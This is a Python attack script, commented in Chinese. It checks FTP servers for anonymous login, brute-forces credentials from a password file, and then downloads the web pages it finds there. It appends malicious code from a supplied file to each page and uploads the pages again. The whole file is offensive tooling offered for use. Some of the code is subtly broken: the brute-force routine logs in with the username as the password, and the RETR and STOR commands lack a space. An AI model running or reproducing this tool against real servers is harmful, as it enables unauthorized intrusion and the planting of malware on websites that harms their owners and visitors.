import ftplib
import optparse
import time


def anonlogin(hostname):
    '''
    测试是否可以匿名登录一个指定的ftp站点
    :param hostname:
    :return:
    '''
    try:
        ftpobj = ftplib.FTP(hostname)
        ftpobj.login('anonymous','test@163.com')
        print('[-] ftp %s anonymous login succeeded'%hostname)
        ftpobj.quit()
        return True
    except Exception as e:
        print('[-] ftp %s anonymous login failed' % hostname)
        return False

def brutelogin(hostname,passwordfile):
    '''
    使用密码本暴力登录别人的ftp，如果找到正确的用户名密码，则返回
    :param hostname:
    :param passwordfile:
    :return:
    '''
    with open(passwordfile,'r') as fp:
        while True:
            time.sleep(1)
            line = fp.readline()
            if line:
                username = line.split(':')[0]
                password = line.split(':')[1].strip()
                print('[-] trying %s:%s on %s'%(username,password,hostname))
                try:
                    ftpobj = ftplib.FTP(hostname)
                    ftpobj.login(username, username)
                    print('[-] ftp %s anonymous login succeeded' % hostname)
                    ftpobj.quit()
                    return username,password
                except:
                    pass
            else:
                # print('no more line')
                break
    print('[-] could not find a valid user to login')
    return None,None

def get_default_page(ftpobj):
    '''
    查看ftp中是不使用网页文件
    :param ftpobj:
    :return:
    '''
    defaut_page_patter_li = ['.php','.html','.htm','.asp']
    try:
        dir_li = ftpobj.nlst()
    except:
        dir_li = []
        print('could not list directory contents')
        return

    defpage_li = []
    for file_name in dir_li:
        for dpp in defaut_page_patter_li:
            if file_name.endswith(dpp):
                print('[-] find a valid webpage %s'%file_name)
                defpage_li.append(file_name)
    return defpage_li

def inject_page(ftpobj,page,redirect):
    '''
    从ftp下载指定页面，将恶意代码注入页面，上传到ftp
    :param ftpobj:
    :param page:
    :param redirect:保存恶意代码的文件
    :return:
    '''
    # 将从ftp下载的文件，写入到本地.tmp文件内
    f = open(page+'.tmp','w')
    ftpobj.retrlines('RETR'+page,f.write)

    # 在网页中注入恶意代码
    with open(redirect,'r') as badass:
        while True:
            content = badass.readline()
            if not content:
                break
            else:
                f.write(content)

    f.close()

    # 将有恶意代码的网页，重新上传到ftp服务器
    ftpobj.storlines('STOR'+page,open(page+'.tmp'))

def attack_ftp(username,password,tghost,redirect):
    '''
    登录一个ftp服务器，并且在其根目录内的默认页面注入恶意代码
    :param username:
    :param password:
    :param tghost:
    :param redirect:
    :return:
    '''
    ftpobj = ftplib.FTP()
    try:
        ftpobj.connect(host=tghost,port=21)
        ftpobj.login(user=username,passwd=password)
        print('logon ftp server %s successfully'%tghost)

        # 为该ftp服务器根目录内的默认网页，全部注入恶意代码
        dpp_li = get_default_page(ftpobj)
        for dpp in dpp_li:
            inject_page(ftpobj,dpp,redirect)
    except Exception as e:
        print(str(e))

def main():
    '''
    攻击程序主逻辑
    :return:
    '''
    # 设置读取命令行参数
    parser = optparse.OptionParser(usage='usage%prog '+'-H <taget host> -r <redirect page> [-f <userpass file>]')
    parser.add_option('-H',dest='taghost',type='string')
    parser.add_option('-f',dest='pwdfile',type='string')
    parser.add_option('-r',dest='redirect',type='string')

    options,args = parser.parse_args()
    taghost_li = str(options.taghost).strip().split(',')
    passwdfile = options.pwdfile.strip()
    redirect = options.redirect.strip()

    if not taghost_li or not redirect:
        print(parser.usage)
        exit(0)

    # 依次攻击输入的主机
    for taghost in taghost_li:
        # 使用匿名用户攻击服务器
        if anonlogin(taghost):
            username = 'anonymous'
            password = 'test@163.com'
            print('[-] using anonymous user to attack %s'%taghost)

            attack_ftp(username,password,taghost,redirect)

        # 使用暴力破解得到的用户名密码，攻击服务器
        if passwdfile:
            username,password = brutelogin(taghost,passwdfile)
            if password:
                print('[-] using %s:%s on %s to attack'%(username,password,taghost))
                attack_ftp(username, password, taghost, redirect)

        # 遇到无法攻击成功的ftp服务器，输出提示信息
        print('[-] cannot find a valid way to attack %s'%taghost)

    return


if __name__ == '__main__':
    main()